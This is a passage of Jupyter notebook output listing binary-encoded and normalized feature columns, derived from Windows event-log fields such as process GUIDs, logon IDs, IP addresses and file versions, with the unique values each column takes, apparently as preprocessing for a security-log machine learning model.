      "binary_Computer_3              ['0', '1']\n",
      "binary_Computer_4              ['0', '1']\n",
      "binary_Computer_5              ['0', '1']\n",
      "binary_Computer_6              ['0', '1']\n",
      "binary_Computer_7              ['0', '1']\n",
      "binary_RuleName_0              ['0', '1']\n",
      "binary_RuleName_1              ['0', '1']\n",
      "binary_RuleName_2              ['0', '1']\n",
      "binary_RuleName_3              ['0', '1']\n",
      "binary_RuleName_4              ['0', '1']\n",
      "binary_RuleName_5              ['0', '1']\n",
      "binary_RuleName_6              ['0', '1']\n",
      "binary_RuleName_7              ['0', '1']\n",
      "binary_TerminalSessionId_0     ['0', '1']\n",
      "binary_TerminalSessionId_1     ['0', '1']\n",
      "binary_TerminalSessionId_2     ['0', '1']\n",
      "binary_TerminalSessionId_3     ['0', '1']\n",
      "binary_TerminalSessionId_4     ['0', '1']\n",
      "binary_TerminalSessionId_5     ['0', '1']\n",
      "binary_TerminalSessionId_6     ['0', '1']\n",
      "binary_TerminalSessionId_7     ['0', '1']\n",
      "binary_Version_0               ['0', '1']\n",
      "binary_Version_1               ['0', '1']\n",
      "binary_Version_2               ['0', '1']\n",
      "binary_Version_3               ['0', '1']\n",
      "binary_Version_4               ['0', '1']\n",
      "binary_Version_5               ['0', '1']\n",
      "binary_Version_6               ['0', '1']\n",
      "binary_Version_7               ['0', '1']\n",
      "binary_User_0                  ['0', '1']\n",
      "binary_User_1                  ['0', '1']\n",
      "binary_User_2                  ['0', '1']\n",
      "binary_User_3                  ['0', '1']\n",
      "binary_User_4                  ['0', '1']\n",
      "binary_User_5                  ['0', '1']\n",
      "binary_User_6                  ['0', '1']\n",
      "binary_User_7                  ['0', '1']\n",
      "binary_ParentUser_0            ['0', '1']\n",
      "binary_ParentUser_1            ['0', '1']\n",
      "binary_ParentUser_2            ['0', '1']\n",
      "binary_ParentUser_3            ['0', '1']\n",
      "binary_ParentUser_4            ['0', '1']\n",
      "binary_ParentUser_5            ['0', '1']\n",
      "binary_ParentUser_6            ['0', '1']\n",
      "binary_ParentUser_7            ['0', '1']\n",
      "binary_Guid_0                  ['0', 'nan']\n",
      "binary_Guid_1                  ['0', 'nan', '1']\n",
      "binary_Guid_2                  ['nan', '1']\n",
      "binary_Guid_3                  ['nan', '1']\n",
      "binary_Guid_4                  ['0', 'nan', '1']\n",
      "binary_Guid_5                  ['nan', '0', '1']\n",
      "binary_Guid_6                  ['nan', '1']\n",
      "binary_Guid_7                  ['0', 'nan']\n",
      "binary_Guid_8                  ['0', 'nan']\n",
      "binary_Guid_9                  ['0', 'nan', '1']\n",
      "binary_Guid_10                 ['0', 'nan', '1']\n",
      "binary_Guid_11                 ['nan', '0', '1']\n",
      "binary_Guid_12                 ['nan', '0', '1']\n",
      "binary_Guid_13                 ['0', 'nan', '1']\n",
      "binary_Guid_14                 ['nan', '0', '1']\n",
      "binary_Guid_15                 ['nan', '0', '1']\n",
      "binary_ProcessGuid_0           ['0', 'nan', '1']\n",
      "binary_ProcessGuid_1           ['0', 'nan', '1']\n",
      "binary_ProcessGuid_2           ['0', 'nan', '1']\n",
      "binary_ProcessGuid_3           ['0', 'nan', '1']\n",
      "binary_ProcessGuid_4           ['0', 'nan', '1']\n",
      "binary_ProcessGuid_5           ['0', 'nan', '1']\n",
      "binary_ProcessGuid_6           ['0', 'nan', '1']\n",
      "binary_ProcessGuid_7           ['0', 'nan', '1']\n",
      "binary_ProcessGuid_8           ['0', 'nan', '1']\n",
      "binary_ProcessGuid_9           ['0', 'nan', '1']\n",
      "binary_ProcessGuid_10          ['0', 'nan', '1']\n",
      "binary_ProcessGuid_11          ['0', 'nan', '1']\n",
      "binary_ProcessGuid_12          ['0', 'nan', '1']\n",
      "binary_ProcessGuid_13          ['0', 'nan', '1']\n",
      "binary_ProcessGuid_14          ['0', 'nan', '1']\n",
      "binary_ProcessGuid_15          ['0', 'nan', '1']\n",
      "binary_ParentProcessGuid_0     ['0', 'nan', '1']\n",
      "binary_ParentProcessGuid_1     ['0', 'nan', '1']\n",
      "binary_ParentProcessGuid_2     ['0', 'nan', '1']\n",
      "binary_ParentProcessGuid_3     ['0', 'nan', '1']\n",
      "binary_ParentProcessGuid_4     ['0', 'nan', '1']\n",
      "binary_ParentProcessGuid_5     ['0', 'nan', '1']\n",
      "binary_ParentProcessGuid_6     ['0', 'nan', '1']\n",
      "binary_ParentProcessGuid_7     ['0', 'nan', '1']\n",
      "binary_ParentProcessGuid_8     ['0', 'nan', '1']\n",
      "binary_ParentProcessGuid_9     ['0', 'nan', '1']\n",
      "binary_ParentProcessGuid_10    ['0', 'nan', '1']\n",
      "binary_ParentProcessGuid_11    ['0', 'nan', '1']\n",
      "binary_ParentProcessGuid_12    ['0', 'nan', '1']\n",
      "binary_ParentProcessGuid_13    ['0', 'nan', '1']\n",
      "binary_ParentProcessGuid_14    ['0', 'nan', '1']\n",
      "binary_ParentProcessGuid_15    ['0', 'nan', '1']\n",
      "binary_SourceProcessGUID_0     ['nan', '0', '1']\n",
      "binary_SourceProcessGUID_1     ['nan', '0', '1']\n",
      "binary_SourceProcessGUID_2     ['nan', '0', '1']\n",
      "binary_SourceProcessGUID_3     ['0', 'nan', '1']\n",
      "binary_SourceProcessGUID_4     ['nan', '0', '1']\n",
      "binary_SourceProcessGUID_5     ['nan', '0', '1']\n",
      "binary_SourceProcessGUID_6     ['0', 'nan', '1']\n",
      "binary_SourceProcessGUID_7     ['nan', '0', '1']\n",
      "binary_SourceProcessGUID_8     ['0', 'nan', '1']\n",
      "binary_SourceProcessGUID_9     ['nan', '0', '1']\n",
      "binary_SourceProcessGUID_10    ['nan', '0', '1']\n",
      "binary_SourceProcessGUID_11    ['nan', '0', '1']\n",
      "binary_SourceProcessGUID_12    ['nan', '0', '1']\n",
      "binary_SourceProcessGUID_13    ['0', 'nan', '1']\n",
      "binary_SourceProcessGUID_14    ['nan', '0', '1']\n",
      "binary_SourceProcessGUID_15    ['0', 'nan', '1']\n",
      "binary_TargetProcessGUID_0     ['nan', '0', '1']\n",
      "binary_TargetProcessGUID_1     ['nan', '0', '1']\n",
      "binary_TargetProcessGUID_2     ['nan', '0', '1']\n",
      "binary_TargetProcessGUID_3     ['0', 'nan', '1']\n",
      "binary_TargetProcessGUID_4     ['nan', '0', '1']\n",
      "binary_TargetProcessGUID_5     ['nan', '0', '1']\n",
      "binary_TargetProcessGUID_6     ['0', 'nan', '1']\n",
      "binary_TargetProcessGUID_7     ['nan', '0', '1']\n",
      "binary_TargetProcessGUID_8     ['0', 'nan', '1']\n",
      "binary_TargetProcessGUID_9     ['nan', '0', '1']\n",
      "binary_TargetProcessGUID_10    ['nan', '0', '1']\n",
      "binary_TargetProcessGUID_11    ['nan', '0', '1']\n",
      "binary_TargetProcessGUID_12    ['nan', '0', '1']\n",
      "binary_TargetProcessGUID_13    ['0', 'nan', '1']\n",
      "binary_TargetProcessGUID_14    ['nan', '0', '1']\n",
      "binary_TargetProcessGUID_15    ['0', 'nan', '1']\n",
      "binary_SourceProcessGuid_0     ['0', 'nan', '1']\n",
      "binary_SourceProcessGuid_1     ['0', 'nan', '1']\n",
      "binary_SourceProcessGuid_2     ['0', 'nan', '1']\n",
      "binary_SourceProcessGuid_3     ['0', 'nan', '1']\n",
      "binary_SourceProcessGuid_4     ['0', 'nan', '1']\n",
      "binary_SourceProcessGuid_5     ['0', 'nan', '1']\n",
      "binary_SourceProcessGuid_6     ['0', 'nan', '1']\n",
      "binary_SourceProcessGuid_7     ['0', 'nan', '1']\n",
      "binary_SourceProcessGuid_8     ['0', 'nan', '1']\n",
      "binary_SourceProcessGuid_9     ['0', 'nan', '1']\n",
      "binary_SourceProcessGuid_10    ['0', 'nan', '1']\n",
      "binary_SourceProcessGuid_11    ['0', 'nan', '1']\n",
      "binary_SourceProcessGuid_12    ['0', 'nan', '1']\n",
      "binary_SourceProcessGuid_13    ['0', 'nan', '1']\n",
      "binary_SourceProcessGuid_14    ['0', 'nan', '1']\n",
      "binary_SourceProcessGuid_15    ['0', 'nan', '1']\n",
      "binary_LogonGuid_0             ['0', 'nan', '1']\n",
      "binary_LogonGuid_1             ['0', 'nan', '1']\n",
      "binary_LogonGuid_2             ['0', 'nan', '1']\n",
      "binary_LogonGuid_3             ['0', 'nan', '1']\n",
      "binary_LogonGuid_4             ['0', 'nan', '1']\n",
      "binary_LogonGuid_5             ['0', 'nan', '1']\n",
      "binary_LogonGuid_6             ['0', 'nan', '1']\n",
      "binary_LogonGuid_7             ['0', 'nan', '1']\n",
      "binary_LogonGuid_8             ['0', 'nan', '1']\n",
      "binary_LogonGuid_9             ['0', 'nan', '1']\n",
      "binary_LogonGuid_10            ['0', 'nan', '1']\n",
      "binary_LogonGuid_11            ['0', 'nan', '1']\n",
      "binary_LogonGuid_12            ['0', 'nan', '1']\n",
      "binary_LogonGuid_13            ['0', 'nan', '1']\n",
      "binary_LogonGuid_14            ['0', 'nan', '1']\n",
      "binary_LogonGuid_15            ['0', 'nan', '1']\n",
      "binary_ThreadID_0              ['0', 'nan', '1']\n",
      "binary_ThreadID_1              ['0', 'nan', '1']\n",
      "binary_ThreadID_2              ['0', 'nan', '1']\n",
      "binary_ThreadID_3              ['0', 'nan', '1']\n",
      "binary_ThreadID_4              ['0', 'nan', '1']\n",
      "binary_ThreadID_5              ['0', 'nan', '1']\n",
      "binary_ThreadID_6              ['0', 'nan', '1']\n",
      "binary_ThreadID_7              ['0', 'nan', '1']\n",
      "binary_ThreadID_8              ['0', 'nan', '1']\n",
      "binary_ThreadID_9              ['0', 'nan', '1']\n",
      "binary_ThreadID_10             ['0', 'nan', '1']\n",
      "binary_ThreadID_11             ['0', 'nan', '1']\n",
      "binary_ThreadID_12             ['0', 'nan', '1']\n",
      "binary_ThreadID_13             ['0', 'nan', '1']\n",
      "binary_ThreadID_14             ['0', 'nan', '1']\n",
      "binary_ThreadID_15             ['0', 'nan', '1']\n",
      "binary_LogonId_0               ['0', 'nan', '1']\n",
      "binary_LogonId_1               ['0', 'nan', '1']\n",
      "binary_LogonId_2               ['0', 'nan', '1']\n",
      "binary_LogonId_3               ['0', 'nan', '1']\n",
      "binary_LogonId_4               ['0', 'nan', '1']\n",
      "binary_LogonId_5               ['0', 'nan', '1']\n",
      "binary_LogonId_6               ['0', 'nan', '1']\n",
      "binary_LogonId_7               ['0', 'nan', '1']\n",
      "binary_LogonId_8               ['0', 'nan', '1']\n",
      "binary_LogonId_9               ['0', 'nan', '1']\n",
      "binary_LogonId_10              ['0', 'nan', '1']\n",
      "binary_LogonId_11              ['0', 'nan', '1']\n",
      "binary_LogonId_12              ['0', 'nan', '1']\n",
      "binary_LogonId_13              ['0', 'nan', '1']\n",
      "binary_LogonId_14              ['0', 'nan', '1']\n",
      "binary_LogonId_15              ['0', 'nan', '1']\n",
      "binary_SourceHostname_0        ['0', 'nan', '1']\n",
      "binary_SourceHostname_1        ['0', 'nan', '1']\n",
      "binary_SourceHostname_2        ['0', 'nan', '1']\n",
      "binary_SourceHostname_3        ['0', 'nan', '1']\n",
      "binary_SourceHostname_4        ['0', 'nan', '1']\n",
      "binary_SourceHostname_5        ['0', 'nan', '1']\n",
      "binary_SourceHostname_6        ['0', 'nan', '1']\n",
      "binary_SourceHostname_7        ['0', 'nan', '1']\n",
      "binary_SourceHostname_8        ['0', 'nan', '1']\n",
      "binary_SourceHostname_9        ['0', 'nan', '1']\n",
      "binary_SourceHostname_10       ['0', 'nan', '1']\n",
      "binary_SourceHostname_11       ['0', 'nan', '1']\n",
      "binary_SourceHostname_12       ['0', 'nan', '1']\n",
      "binary_SourceHostname_13       ['0', 'nan', '1']\n",
      "binary_SourceHostname_14       ['0', 'nan', '1']\n",
      "binary_SourceHostname_15       ['0', 'nan', '1']\n",
      "binary_OriginalFileName_0      ['0', 'nan', '1']\n",
      "binary_OriginalFileName_1      ['0', 'nan', '1']\n",
      "binary_OriginalFileName_2      ['0', 'nan', '1']\n",
      "binary_OriginalFileName_3      ['0', 'nan', '1']\n",
      "binary_OriginalFileName_4      ['0', 'nan', '1']\n",
      "binary_OriginalFileName_5      ['0', 'nan', '1']\n",
      "binary_OriginalFileName_6      ['0', 'nan', '1']\n",
      "binary_OriginalFileName_7      ['0', 'nan', '1']\n",
      "binary_OriginalFileName_8      ['0', 'nan', '1']\n",
      "binary_OriginalFileName_9      ['0', 'nan', '1']\n",
      "binary_OriginalFileName_10     ['0', 'nan', '1']\n",
      "binary_OriginalFileName_11     ['0', 'nan', '1']\n",
      "binary_OriginalFileName_12     ['0', 'nan', '1']\n",
      "binary_OriginalFileName_13     ['0', 'nan', '1']\n",
      "binary_OriginalFileName_14     ['0', 'nan', '1']\n",
      "binary_OriginalFileName_15     ['0', 'nan', '1']\n",
      "binary_TargetProcessGuid_0     ['0', 'nan', '1']\n",
      "binary_TargetProcessGuid_1     ['0', 'nan', '1']\n",
      "binary_TargetProcessGuid_2     ['0', 'nan', '1']\n",
      "binary_TargetProcessGuid_3     ['0', 'nan', '1']\n",
      "binary_TargetProcessGuid_4     ['0', 'nan', '1']\n",
      "binary_TargetProcessGuid_5     ['0', 'nan', '1']\n",
      "binary_TargetProcessGuid_6     ['0', 'nan', '1']\n",
      "binary_TargetProcessGuid_7     ['0', 'nan', '1']\n",
      "binary_TargetProcessGuid_8     ['0', 'nan', '1']\n",
      "binary_TargetProcessGuid_9     ['0', 'nan', '1']\n",
      "binary_TargetProcessGuid_10    ['0', 'nan', '1']\n",
      "binary_TargetProcessGuid_11    ['0', 'nan', '1']\n",
      "binary_TargetProcessGuid_12    ['0', 'nan', '1']\n",
      "binary_TargetProcessGuid_13    ['0', 'nan', '1']\n",
      "binary_TargetProcessGuid_14    ['0', 'nan', '1']\n",
      "binary_TargetProcessGuid_15    ['0', 'nan', '1']\n",
      "binary_DestinationHostname_0   ['0', 'nan', '1']\n",
      "binary_DestinationHostname_1   ['0', 'nan', '1']\n",
      "binary_DestinationHostname_2   ['0', 'nan', '1']\n",
      "binary_DestinationHostname_3   ['0', 'nan', '1']\n",
      "binary_DestinationHostname_4   ['0', 'nan', '1']\n",
      "binary_DestinationHostname_5   ['0', 'nan', '1']\n",
      "binary_DestinationHostname_6   ['0', 'nan', '1']\n",
      "binary_DestinationHostname_7   ['0', 'nan', '1']\n",
      "binary_DestinationHostname_8   ['0', 'nan', '1']\n",
      "binary_DestinationHostname_9   ['0', 'nan', '1']\n",
      "binary_DestinationHostname_10  ['0', 'nan', '1']\n",
      "binary_DestinationHostname_11  ['0', 'nan', '1']\n",
      "binary_DestinationHostname_12  ['0', 'nan', '1']\n",
      "binary_DestinationHostname_13  ['0', 'nan', '1']\n",
      "binary_DestinationHostname_14  ['0', 'nan', '1']\n",
      "binary_DestinationHostname_15  ['0', 'nan', '1']\n",
      "binary_SourcePortName_0        ['0', 'nan', '1']\n",
      "binary_SourcePortName_1        ['0', 'nan', '1']\n",
      "binary_SourcePortName_2        ['0', 'nan', '1']\n",
      "binary_SourcePortName_3        ['0', 'nan', '1']\n",
      "binary_SourcePortName_4        ['0', 'nan', '1']\n",
      "binary_SourcePortName_5        ['0', 'nan', '1']\n",
      "binary_SourcePortName_6        ['0', 'nan', '1']\n",
      "binary_SourcePortName_7        ['0', 'nan', '1']\n",
      "binary_SourcePortName_8        ['0', 'nan', '1']\n",
      "binary_SourcePortName_9        ['0', 'nan', '1']\n",
      "binary_SourcePortName_10       ['0', 'nan', '1']\n",
      "binary_SourcePortName_11       ['0', 'nan', '1']\n",
      "binary_SourcePortName_12       ['0', 'nan', '1']\n",
      "binary_SourcePortName_13       ['0', 'nan', '1']\n",
      "binary_SourcePortName_14       ['0', 'nan', '1']\n",
      "binary_SourcePortName_15       ['0', 'nan', '1']\n",
      "binary_DestinationPortName_0   ['0', 'nan', '1']\n",
      "binary_DestinationPortName_1   ['0', 'nan', '1']\n",
      "binary_DestinationPortName_2   ['0', 'nan', '1']\n",
      "binary_DestinationPortName_3   ['0', 'nan', '1']\n",
      "binary_DestinationPortName_4   ['0', 'nan', '1']\n",
      "binary_DestinationPortName_5   ['0', 'nan', '1']\n",
      "binary_DestinationPortName_6   ['0', 'nan', '1']\n",
      "binary_DestinationPortName_7   ['0', 'nan', '1']\n",
      "binary_DestinationPortName_8   ['0', 'nan', '1']\n",
      "binary_DestinationPortName_9   ['0', 'nan', '1']\n",
      "binary_DestinationPortName_10  ['0', 'nan', '1']\n",
      "binary_DestinationPortName_11  ['0', 'nan', '1']\n",
      "binary_DestinationPortName_12  ['0', 'nan', '1']\n",
      "binary_DestinationPortName_13  ['0', 'nan', '1']\n",
      "binary_DestinationPortName_14  ['0', 'nan', '1']\n",
      "binary_DestinationPortName_15  ['0', 'nan', '1']\n",
      "binary_StartAddress_0          ['0', 'nan', '1']\n",
      "binary_StartAddress_1          ['0', 'nan', '1']\n",
      "binary_StartAddress_2          ['0', 'nan', '1']\n",
      "binary_StartAddress_3          ['0', 'nan', '1']\n",
      "binary_StartAddress_4          ['0', 'nan', '1']\n",
      "binary_StartAddress_5          ['0', 'nan', '1']\n",
      "binary_StartAddress_6          ['0', 'nan', '1']\n",
      "binary_StartAddress_7          ['0', 'nan', '1']\n",
      "binary_StartAddress_8          ['0', 'nan', '1']\n",
      "binary_StartAddress_9          ['0', 'nan', '1']\n",
      "binary_StartAddress_10         ['0', 'nan', '1']\n",
      "binary_StartAddress_11         ['0', 'nan', '1']\n",
      "binary_StartAddress_12         ['0', 'nan', '1']\n",
      "binary_StartAddress_13         ['0', 'nan', '1']\n",
      "binary_StartAddress_14         ['0', 'nan', '1']\n",
      "binary_StartAddress_15         ['0', 'nan', '1']\n",
      "binary_StartModule_0           ['0', 'nan', '1']\n",
      "binary_StartModule_1           ['0', 'nan', '1']\n",
      "binary_StartModule_2           ['0', 'nan', '1']\n",
      "binary_StartModule_3           ['0', 'nan', '1']\n",
      "binary_StartModule_4           ['0', 'nan', '1']\n",
      "binary_StartModule_5           ['0', 'nan', '1']\n",
      "binary_StartModule_6           ['0', 'nan', '1']\n",
      "binary_StartModule_7           ['0', 'nan', '1']\n",
      "binary_StartModule_8           ['0', 'nan', '1']\n",
      "binary_StartModule_9           ['0', 'nan', '1']\n",
      "binary_StartModule_10          ['0', 'nan', '1']\n",
      "binary_StartModule_11          ['0', 'nan', '1']\n",
      "binary_StartModule_12          ['0', 'nan', '1']\n",
      "binary_StartModule_13          ['0', 'nan', '1']\n",
      "binary_StartModule_14          ['nan', '1']\n",
      "binary_StartModule_15          ['0', 'nan', '1']\n",
      "binary_NewThreadId_0           ['0', 'nan', '1']\n",
      "binary_NewThreadId_1           ['0', 'nan', '1']\n",
      "binary_NewThreadId_2           ['0', 'nan', '1']\n",
      "binary_NewThreadId_3           ['0', 'nan', '1']\n",
      "binary_NewThreadId_4           ['0', 'nan', '1']\n",
      "binary_NewThreadId_5           ['0', 'nan', '1']\n",
      "binary_NewThreadId_6           ['0', 'nan', '1']\n",
      "binary_NewThreadId_7           ['0', 'nan', '1']\n",
      "binary_NewThreadId_8           ['0', 'nan', '1']\n",
      "binary_NewThreadId_9           ['0', 'nan', '1']\n",
      "binary_NewThreadId_10          ['0', 'nan', '1']\n",
      "binary_NewThreadId_11          ['0', 'nan', '1']\n",
      "binary_NewThreadId_12          ['0', 'nan', '1']\n",
      "binary_NewThreadId_13          ['0', 'nan', '1']\n",
      "binary_NewThreadId_14          ['0', 'nan', '1']\n",
      "binary_NewThreadId_15          ['0', 'nan', '1']\n",
      "binary_GrantedAccess_0         ['nan', '0', '1']\n",
      "binary_GrantedAccess_1         ['nan', '0', '1']\n",
      "binary_GrantedAccess_2         ['nan', '0', '1']\n",
      "binary_GrantedAccess_3         ['0', 'nan', '1']\n",
      "binary_GrantedAccess_4         ['nan', '0', '1']\n",
      "binary_GrantedAccess_5         ['nan', '0', '1']\n",
      "binary_GrantedAccess_6         ['0', 'nan', '1']\n",
      "binary_GrantedAccess_7         ['nan', '0', '1']\n",
      "binary_GrantedAccess_8         ['0', 'nan', '1']\n",
      "binary_GrantedAccess_9         ['nan', '0', '1']\n",
      "binary_GrantedAccess_10        ['nan', '0', '1']\n",
      "binary_GrantedAccess_11        ['nan', '0', '1']\n",
      "binary_GrantedAccess_12        ['nan', '0', '1']\n",
      "binary_GrantedAccess_13        ['0', 'nan', '1']\n",
      "binary_GrantedAccess_14        ['nan', '0', '1']\n",
      "binary_GrantedAccess_15        ['0', 'nan', '1']\n",
      "binary_QueryName_0             ['nan', '0', '1']\n",
      "binary_QueryName_1             ['nan', '0', '1']\n",
      "binary_QueryName_2             ['nan', '0', '1']\n",
      "binary_QueryName_3             ['0', 'nan', '1']\n",
      "binary_QueryName_4             ['nan', '0', '1']\n",
      "binary_QueryName_5             ['nan', '0', '1']\n",
      "binary_QueryName_6             ['0', 'nan', '1']\n",
      "binary_QueryName_7             ['nan', '0', '1']\n",
      "binary_QueryName_8             ['0', 'nan', '1']\n",
      "binary_QueryName_9             ['nan', '0', '1']\n",
      "binary_QueryName_10            ['nan', '0', '1']\n",
      "binary_QueryName_11            ['nan', '0', '1']\n",
      "binary_QueryName_12            ['nan', '0', '1']\n",
      "binary_QueryName_13            ['0', 'nan', '1']\n",
      "binary_QueryName_14            ['nan', '0', '1']\n",
      "binary_QueryName_15            ['0', 'nan', '1']\n",
      "binary_QueryResults_0          ['nan', '0', '1']\n",
      "binary_QueryResults_1          ['nan', '0', '1']\n",
      "binary_QueryResults_2          ['nan', '0', '1']\n",
      "binary_QueryResults_3          ['0', 'nan', '1']\n",
      "binary_QueryResults_4          ['nan', '0', '1']\n",
      "binary_QueryResults_5          ['nan', '0', '1']\n",
      "binary_QueryResults_6          ['0', 'nan', '1']\n",
      "binary_QueryResults_7          ['nan', '0', '1']\n",
      "binary_QueryResults_8          ['0', 'nan', '1']\n",
      "binary_QueryResults_9          ['nan', '0', '1']\n",
      "binary_QueryResults_10         ['nan', '0', '1']\n",
      "binary_QueryResults_11         ['nan', '0', '1']\n",
      "binary_QueryResults_12         ['nan', '0', '1']\n",
      "binary_QueryResults_13         ['0', 'nan', '1']\n",
      "binary_QueryResults_14         ['nan', '0', '1']\n",
      "binary_QueryResults_15         ['0', 'nan', '1']\n",
      "binary_Hashes_0                ['0', 'nan', '1']\n",
      "binary_Hashes_1                ['0', 'nan', '1']\n",
      "binary_Hashes_2                ['0', 'nan', '1']\n",
      "binary_Hashes_3                ['0', 'nan', '1']\n",
      "binary_Hashes_4                ['0', 'nan', '1']\n",
      "binary_Hashes_5                ['0', 'nan', '1']\n",
      "binary_Hashes_6                ['0', 'nan', '1']\n",
      "binary_Hashes_7                ['0', 'nan', '1']\n",
      "binary_Hashes_8                ['0', 'nan', '1']\n",
      "binary_Hashes_9                ['0', 'nan', '1']\n",
      "binary_Hashes_10               ['0', 'nan', '1']\n",
      "binary_Hashes_11               ['0', 'nan', '1']\n",
      "binary_Hashes_12               ['0', 'nan', '1']\n",
      "binary_Hashes_13               ['0', 'nan', '1']\n",
      "binary_Hashes_14               ['0', 'nan', '1']\n",
      "binary_Hashes_15               ['0', 'nan', '1']\n",
      "binary_Hash_0                  ['0', 'nan', '1']\n",
      "binary_Hash_1                  ['0', 'nan', '1']\n",
      "binary_Hash_2                  ['0', 'nan', '1']\n",
      "binary_Hash_3                  ['0', 'nan', '1']\n",
      "binary_Hash_4                  ['0', 'nan', '1']\n",
      "binary_Hash_5                  ['0', 'nan', '1']\n",
      "binary_Hash_6                  ['0', 'nan', '1']\n",
      "binary_Hash_7                  ['0', 'nan', '1']\n",
      "binary_Hash_8                  ['0', 'nan', '1']\n",
      "binary_Hash_9                  ['0', 'nan', '1']\n",
      "binary_Hash_10                 ['0', 'nan', '1']\n",
      "binary_Hash_11                 ['0', 'nan', '1']\n",
      "binary_Hash_12                 ['0', 'nan', '1']\n",
      "binary_Hash_13                 ['0', 'nan', '1']\n",
      "binary_Hash_14                 ['0', 'nan', '1']\n",
      "binary_Hash_15                 ['0', 'nan', '1']\n",
      "binary_Contents_0              ['0', 'nan', '1']\n",
      "binary_Contents_1              ['0', 'nan', '1']\n",
      "binary_Contents_2              ['0', 'nan', '1']\n",
      "binary_Contents_3              ['0', 'nan', '1']\n",
      "binary_Contents_4              ['0', 'nan', '1']\n",
      "binary_Contents_5              ['0', 'nan', '1']\n",
      "binary_Contents_6              ['0', 'nan', '1']\n",
      "binary_Contents_7              ['0', 'nan', '1']\n",
      "binary_Contents_8              ['0', 'nan', '1']\n",
      "binary_Contents_9              ['0', 'nan', '1']\n",
      "binary_Contents_10             ['0', 'nan', '1']\n",
      "binary_Contents_11             ['0', 'nan', '1']\n",
      "binary_Contents_12             ['0', 'nan', '1']\n",
      "binary_Contents_13             ['0', 'nan', '1']\n",
      "binary_Contents_14             ['0', 'nan', '1']\n",
      "binary_Contents_15             ['0', 'nan', '1']\n",
      "SourceIp_binary_0              ['0', '1']\n",
      "SourceIp_binary_1              ['0', '1']\n",
      "SourceIp_binary_2              ['0', '1']\n",
      "SourceIp_binary_3              ['0', '1']\n",
      "SourceIp_binary_4              ['0', '1']\n",
      "SourceIp_binary_5              ['0', '1']\n",
      "SourceIp_binary_6              ['0', '1']\n",
      "SourceIp_binary_7              ['0', '1']\n",
      "SourceIp_binary_8              ['0', '1']\n",
      "SourceIp_binary_9              ['0', '1']\n",
      "SourceIp_binary_10             ['0', '1']\n",
      "SourceIp_binary_11             ['0', '1']\n",
      "SourceIp_binary_12             ['0', '1']\n",
      "SourceIp_binary_13             ['0', '1']\n",
      "SourceIp_binary_14             ['0', '1']\n",
      "SourceIp_binary_15             ['0', '1']\n",
      "SourceIp_prefix_binary_0       ['0', '1']\n",
      "SourceIp_prefix_binary_1       ['0', '1']\n",
      "SourceIp_prefix_binary_2       ['0', '1']\n",
      "SourceIp_prefix_binary_3       ['0', '1']\n",
      "SourceIp_prefix_binary_4       ['0', '1']\n",
      "SourceIp_prefix_binary_5       ['0', '1']\n",
      "SourceIp_prefix_binary_6       ['0', '1']\n",
      "SourceIp_prefix_binary_7       ['0', '1']\n",
      "SourceIp_prefix_binary_8       ['0', '1']\n",
      "SourceIp_prefix_binary_9       ['0', '1']\n",
      "SourceIp_prefix_binary_10      ['0', '1']\n",
      "SourceIp_prefix_binary_11      ['0', '1']\n",
      "SourceIp_prefix_binary_12      ['0', '1']\n",
      "SourceIp_prefix_binary_13      ['0', '1']\n",
      "SourceIp_prefix_binary_14      ['0', '1']\n",
      "SourceIp_prefix_binary_15      ['0', '1']\n",
      "DestinationIp_binary_0         ['0', '1']\n",
      "DestinationIp_binary_1         ['0', '1']\n",
      "DestinationIp_binary_2         ['0', '1']\n",
      "DestinationIp_binary_3         ['0', '1']\n",
      "DestinationIp_binary_4         ['0', '1']\n",
      "DestinationIp_binary_5         ['0', '1']\n",
      "DestinationIp_binary_6         ['0', '1']\n",
      "DestinationIp_binary_7         ['0', '1']\n",
      "DestinationIp_binary_8         ['0', '1']\n",
      "DestinationIp_binary_9         ['0', '1']\n",
      "DestinationIp_binary_10        ['0', '1']\n",
      "DestinationIp_binary_11        ['0', '1']\n",
      "DestinationIp_binary_12        ['0', '1']\n",
      "DestinationIp_binary_13        ['0', '1']\n",
      "DestinationIp_binary_14        ['0', '1']\n",
      "DestinationIp_binary_15        ['0', '1']\n",
      "DestinationIp_prefix_binary_0  ['0', '1']\n",
      "DestinationIp_prefix_binary_1  ['0', '1']\n",
      "DestinationIp_prefix_binary_2  ['0', '1']\n",
      "DestinationIp_prefix_binary_3  ['0', '1']\n",
      "DestinationIp_prefix_binary_4  ['0', '1']\n",
      "DestinationIp_prefix_binary_5  ['0', '1']\n",
      "DestinationIp_prefix_binary_6  ['0', '1']\n",
      "DestinationIp_prefix_binary_7  ['0', '1']\n",
      "DestinationIp_prefix_binary_8  ['0', '1']\n",
      "DestinationIp_prefix_binary_9  ['0', '1']\n",
      "DestinationIp_prefix_binary_10 ['0', '1']\n",
      "DestinationIp_prefix_binary_11 ['0', '1']\n",
      "DestinationIp_prefix_binary_12 ['0', '1']\n",
      "DestinationIp_prefix_binary_13 ['0', '1']\n",
      "DestinationIp_prefix_binary_14 ['0', '1']\n",
      "DestinationIp_prefix_binary_15 ['0', '1']\n",
      "FileVersion_Part_0_normalized  ['0.025487256371814', '0.0049975012493753', '0.0002251238180999', '0.0039980009995002', '0.0714285714285714', '0.1428571428571428', '0.0069965017491254', '0.0002701485817199', '0.0014992503748125', '0.004817649707339']\n",
      "FileVersion_Part_1_normalized  ['0.0047528517110266', '0.9990955137481908', '0.0112156295224312', '0.0494296577946768', '0.024390243902439', '0.010492040520984', '0.01714001447178', '0.0152091254752851', '0.5625', '0.0633592619392185']\n",
      "FileVersion_Part_2_normalized  ['0.0074793792814203', '0.0389347127079547', '0.0051377044596672', '0.034950370473927', '0.0100657066964909', '0.0026212777855445', '0.0055571089053543', '0.0315252341674821', '0.0444568712428351', '0.0773451698588005']\n",
      "FileVersion_Part_3_normalized  ['0.0003622133824908', '0.2655029296875', '0.0041088284286507', '0.0213253128941496', '0.0002975324213317', '0.0049902831760133', '0.01410044953268', '0.0085378868729989', '0.0147019824714595', '0.20123291015625']\n",
      "Description_tfidf_0            ['nan', '0.5169901227431348', '0.6309428492362296', '0.5096877653958601', '0.487194755912427', '0.0']\n",
      "Description_tfidf_1            ['nan', '0.5629853156778106', '0.2535795730882987', '0.0', '0.6057780318131011']\n",
      "Description_tfidf_2            ['0.5629717405024318', 'nan', '0.253301112237522', '0.5198783713387514', '0.4256663458175272', '0.0']\n",
      "Description_tfidf_3            ['nan', '0.5950683495505401', '0.4525940507609635', '0.7027765170838005', '0.5284898169914296', '0.0']\n",
